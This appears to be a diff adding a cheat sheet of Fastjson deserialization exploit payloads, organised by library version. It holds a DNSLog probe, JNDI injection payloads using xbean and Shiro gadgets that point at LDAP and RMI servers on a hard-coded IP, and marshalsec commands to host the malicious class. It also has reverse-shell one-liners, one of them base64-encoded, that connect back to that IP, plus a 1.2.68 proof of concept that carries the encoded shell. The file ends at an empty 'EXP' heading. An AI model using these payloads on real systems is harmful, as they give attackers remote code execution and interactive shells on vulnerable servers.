@@ -1,0 +1,31 @@
+DNSLog:
+
+{"@type":"java.net.Inet4Address", "val":"w94zy2.dnslog.cn"}
+
+1.2.62:
+
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://47.89.230.17:1398/EvilCls"}
+
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://47.89.230.17:1099/EvilCls"}
+
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://47.89.230.17:18088/#EvilCls" 1398
+
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://47.89.230.17:18088/#EvilCls" 1099
+
+Reverse Shell:
+
+rm /tmp/f1;mkfifo /tmp/f1;cat /tmp/f1|/bin/sh -i 2>&1|nc 47.89.230.17 9823 >/tmp/f1
+
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:47.89.230.17:9823
+
+bash -c {echo,c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDo0Ny44OS4yMzAuMTc6OTgyMw==}|{base64,-d}|{bash,-i}
+
+1.2.66:
+
+{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://47.89.230.17:1398/EvilCls"}
+
+1.2.68 PoC:
+
+{"@type":"java.lang.AutoCloseable","@type":"com.example.fastjsondemo.utils.VulnAutoCloseable","cmd":"bash -c {echo,c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDo0Ny44OS4yMzAuMTc6OTgyMw==}|{base64,-d}|{bash,-i}"}
+
+1.2.68 EXP:
